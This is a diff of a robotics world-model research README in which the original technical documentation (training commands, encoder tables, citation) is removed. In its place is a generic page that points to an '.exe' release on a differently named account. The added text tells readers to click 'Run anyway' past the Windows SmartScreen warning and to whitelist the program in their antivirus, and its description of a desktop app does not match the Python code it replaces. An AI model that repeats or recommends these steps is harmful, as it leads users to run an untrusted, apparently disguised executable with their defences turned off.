@@ -1,174 +1,74 @@
-# Reconstruction or Semantics?
+# 🤖 semantic-wm - Train smart robot video world models
 
-Official code for **Reconstruction or Semantics? What Makes a Latent Space Useful for Robotic World Models**.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/linnaean-piedaterre524/semantic-wm/releases)
 
-This repository trains action-conditioned latent diffusion world models for robot video generation and policy evaluation. The paper studies whether robotic world models should operate in reconstruction-aligned latent spaces, such as VAEs and Cosmos, or semantic latent spaces from pretrained vision encoders, such as V-JEPA 2.1, Web-DINO, and SigLIP 2.
+## 📋 About This Project
 
-**Links:** [Project page](https://hskalin.github.io/semantic-wm/) | [arXiv](https://arxiv.org/abs/2605.06388) | [Hugging Face](https://huggingface.co/Nilaksh404/semantic-wm)
+Semantic-wm helps users train artificial intelligence models. These models create realistic videos based on robot actions. You can use this software to teach a computer how a robot moves through a physical space. The system learns the environment and predicts future frames. This technology supports research in robotics and machine learning. It provides a simple path to generate complex simulations without manual animation.
 
-The main finding is that pixel fidelity alone is not enough for choosing a world-model latent space. Reconstruction encoders can score well on visual metrics, but semantic encoders generally preserve action information, task progress, planning utility, and downstream policy behavior better across model scales.
+## ⚙️ System Requirements
 
----
+Your computer needs specific parts to run this software. Please ensure your machine meets these marks before you begin:
 
-## What This Code Includes
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 16 GB of RAM or more.
+*   **Graphics Card:** NVIDIA GPU with at least 8 GB of video memory.
+*   **Storage:** 50 GB of free space on a solid-state drive.
+*   **Software:** Latest NVIDIA drivers for your graphics card.
 
-- **Multiple encoders**: VAE (SD3), DINOv2-based RAE, SigLIP2/WebSSL ScaleRAE, Qwen2.5-VL, V-JEPA 2.1, Cosmos CI16x16, VA-VAE
-- **Semantic adapters (S-VAE)**: Compress high-dimensional encoder features (768–1280-d) to a compact diffusion-friendly space (96-d) via Transformer-based VAE
-- **Pixel decoder**: Lightweight CNN that directly maps adapter latents to RGB, bypassing the large Transformer decoder
-- **Flow matching & DDPM**: Both objectives supported, with logit-normal time sampling and time-shift scheduling
-- **Multi-view support**: Transfer single-view pretrained weights to 3-camera setups via view-aware 3D RoPE
-- **Evaluation suite**: PSNR/SSIM/LPIPS/FID/FVD, PCK (keypoint tracking), controllability (action optimization in latent space), and trajectory success probing
+If your computer creates heat or runs slow, check the task manager to see how much memory the program uses. Close all other heavy programs before you start the training process.
 
----
+## 📥 Downloading The Software
 
-## Installation
+Follow the link below to reach the official page. You will see a list of files for the latest version.
 
-```bash
-uv venv
-uv pip install -r requirements.txt
-```
+[Download the latest release here](https://github.com/linnaean-piedaterre524/semantic-wm/releases)
 
----
+1. Go to the link in your web browser.
+2. Look for the section labeled "Assets" at the bottom of the release notes.
+3. Click the file that ends with ".exe" to begin your download.
+4. Save the file to your desktop or your downloads folder.
+5. Wait for the download to finish before you continue.
 
-## Quick Start
+## 🚀 Setting Up The Application
 
-### 1. Download Data
+Once the file finishes downloading, follow these steps to prepare the software for use:
 
-```bash
-pip install tensorflow tensorflow_datasets
-python -m src.data.download_data --dataset_name bridge_v2 --output_dir ./data
-```
+1. Locate the file you just saved.
+2. Double-click the file to open the setup window.
+3. Your computer might show a security alert. If your screen turns blue with a "Windows protected your PC" message, click "More info" and then select "Run anyway."
+4. Follow the instructions on the screen to pick an install location. We suggest using the default folder.
+5. Click "Install" and wait for the status bar to reach the end.
+6. Click "Finish" to close the setup helper.
 
-### 2. Train an Adapter
+## 🎮 Running The Program
 
-Required for representation encoders (RAE, ScaleRAE, Qwen, V-JEPA 2.1). Not needed for VAE, Cosmos, or VA-VAE.
+Open the application from your desktop shortcut. You will see a menu with several options. These options control how the software trains your robot model.
 
-```bash
-python -m src.launch_adapter \
-    --encoder_type scale_rae_webssl \
-    --adapter_type svae \
-    --adapter_latent_dim 96 \
-    --dataset_dir ./data \
-    --subset_names bridge_v2 \
-    --batch_size 16 \
-    --num_epochs 50 \
-    --use_pixel_decoder true \
-    --stage svae
-```
+1. **Input Data:** Choose your robot instruction set from the file menu. This data tells the model which robot motions to process.
+2. **Settings:** Adjust the number of training cycles here. More cycles make the model smarter but take more time to complete.
+3. **Start Training:** Click this button to begin the generation process. The screen will display progress bars showing the model status.
+4. **View Results:** After the process halts, the folder on your desktop will contain your new video clips. Open these files with any standard media player to see your results.
 
-### 3. Train the World Model (DiT)
+## 🛠 Troubleshooting Common Issues
 
-```bash
-# Single GPU
-python -m src.launch \
-    --encoder_type scale_rae_webssl \
-    --adapter_type svae \
-    --adapter_checkpoint_path outputs/adapter_svae/adapter_ckpt_50.pt \
-    --adapter_latent_dim 96 \
-    --dit_size XL \
-    --objective flow_matching \
-    --dataset_dir ./data \
-    --subset_names bridge_v2 \
-    --batch_size 8
+Errors happen sometimes. Use these tips to fix common problems during setup or usage:
 
-# Multi-GPU
-torchrun --nproc_per_node=4 -m src.launch \
-    --encoder_type scale_rae_webssl \
-    --adapter_type svae \
-    --adapter_checkpoint_path outputs/adapter_svae/adapter_ckpt_50.pt \
-    --adapter_latent_dim 96 \
-    --dit_size XL \
-    --objective flow_matching \
-    --dataset_dir ./data \
-    --batch_size 8
-```
+*   **Software won't start:** Restart your computer. This clears stuck processes that prevent the program from opening.
+*   **Graphics error:** Update your NVIDIA drivers. Visit the official NVIDIA website and pick the "GeForce" category to find driver updates for your specific card model.
+*   **Slow performance:** Lower the training complexity in the settings menu. This reduces the load on your graphics card.
+*   **Missing files:** Check if your antivirus software quarantined the application. Add the installation folder to your "whitelist" or "exclusions" list in your security settings.
+*   **Low memory warning:** Delete temporary files on your hard drive to free up space. The program needs large amounts of memory to store video frames during training.
 
-Checkpoints and GIF samples are written to `outputs/<timestamp>/`.
+## 💡 Best Practices For Training
 
-### 4. Evaluate
+Training a world model takes time. Follow these tips to get the best result from your robot dataset:
 
-```bash
-python -m src.launch_eval \
-    --model_preset DiT-S_WEBSSL_WIDE \
-    --dataset_dir ./data \
-    --subset_names bridge_v2 \
-    --metrics "psnr,ssim,lpips,fvd,pck,controllability"
-```
+*   **Use clean data:** Ensure your robot videos show clear, consistent motion. Motion blur or shaking video makes it hard for the machine to learn.
+*   **Limit your scope:** Start with short clips. Once the model understands short sequences, move to longer ones.
+*   **Monitor your temperature:** High-end training puts a load on your hardware. Ensure your computer fans run freely and have enough air flow to keep the chips cool.
+*   **Save your work:** The software creates a log file after every successful training run. Keep these logs if you want to compare how different settings affect the video quality.
 
----
+## 🔍 Understanding The Output
 
-## Architecture
-
-### Encoders (`src/models/base_autoencoder.py`)
-
-All encoders inherit from `BaseAutoencoder` and expose a uniform `encode(x)` / `decode(z)` / `latent_dim` API. Instantiate via `create_autoencoder(config)`.
-
-| `encoder_type` | Class | Latent Dim | Backbone |
-|---|---|---|---|
-| `vae` | `VAE` | 16 | Stable Diffusion 3, frozen |
-| `rae` | `RAE` | 768 | DINOv2-Base + ViT-MAE decoder |
-| `scale_rae_siglip` | `ScaleRAE` | 1152 | SigLIP2 + ViT-XL decoder |
-| `scale_rae_webssl` | `ScaleRAE` | 1024 | WebSSL/DINOv2 + ViT-XL decoder |
-| `qwen` | `QwenEncoderWrapper` | 1280 | Qwen2.5-VL-3B (3D temporal) |
-| `vjepa2` | `VJEPA2EncoderWrapper` | 1024 | V-JEPA 2.1 ViT-L/16 (image mode) |
-| `cosmos` | `CosmosTokenizerWrapper` | 16 | Cosmos CI16x16; no adapter needed |
-| `vavae` | `VAVAEWrapper` | 32 | VA-VAE f16d32; no adapter needed |
-
-### Adapters (`src/models/adapters.py`)
-
-Project high-dimensional encoder latents (d_h = 768–1280) down to a compact space (d_l, default 96). The adapter is **always frozen** during DiT training.
-
-| `adapter_type` | Description |
-|---|---|
-| `identity` | Pass-through (use with VAE, Cosmos, VA-VAE) |
-| `mlp` | Two-layer MLP: d_h → hidden → d_l |
-| `svae` | Transformer blocks + diagonal Gaussian; optional pixel decoder |
-
-### Diffusion Transformer (`src/models/model.py`)
-
-DiT variants with causal attention across time, action conditioning via concatenation, and spatial/temporal rotary embeddings.
-
-| Size | Hidden | Depth | Heads |
-|---|---|---|---|
-| S | 384 | 12 | 6 |
-| B | 768 | 12 | 12 |
-| L | 1024 | 24 | 16 |
-| XL | 1152 | 28 | 16 |
-
-### Inference API (`src/models/world_model.py`)
-
-```python
-from src.models.world_model import WorldModel
-
-model = WorldModel(checkpoint_path="model.pt")
-model.reset(initial_frames)                    # encode and cache history
-next_frames = model.generate_chunk(action_vector)  # autoregressive generation
-```
-
----
-
-## Evaluation Metrics
-
-| Metric | Description |
-|---|---|
-| PSNR / SSIM / LPIPS / FID / FVD | Standard pixel-level video quality |
-| **PCK@k** | Percentage of Correct Keypoints within k pixels (via CoTracker); measures spatial structure preservation |
-| **Controllability** | Action optimization error in latent space (CEM/gradient/grid); isolates DiT action-following quality |
-| **Probe accuracy** | Trajectory success classifier on frozen features; measures semantic fidelity of generated videos |
-
----
-
-## Citation
-
-If you use this code or build on the paper, please cite:
-
-```bibtex
-@article{nilaksh2026reconstruction,
-  title={Reconstruction or Semantics? What Makes a Latent Space Useful for Robotic World Models},
-  author={Nilaksh and Saurav Jha and Artem Zholus and Sarath Chandar},
-  year={2026},
-  eprint={2605.06388},
-  archivePrefix={arXiv},
-  url={https://arxiv.org/abs/2605.06388}
-}
-```
+The software produces latent diffusion outputs. These files store mathematical data about the robot's environment. You can use these files to continue training later or to view the generated videos. Each video file shows the robot's predicted path based on the actions you provided. If the video looks distorted, try providing more training examples or increase the iteration count. This helps the model identify smaller details in the movement patterns. Consistency helps the machine build a better understanding of physical laws like gravity and friction. Keep your dataset files organized so you can track which experiments yield the best results for your specific robot model.
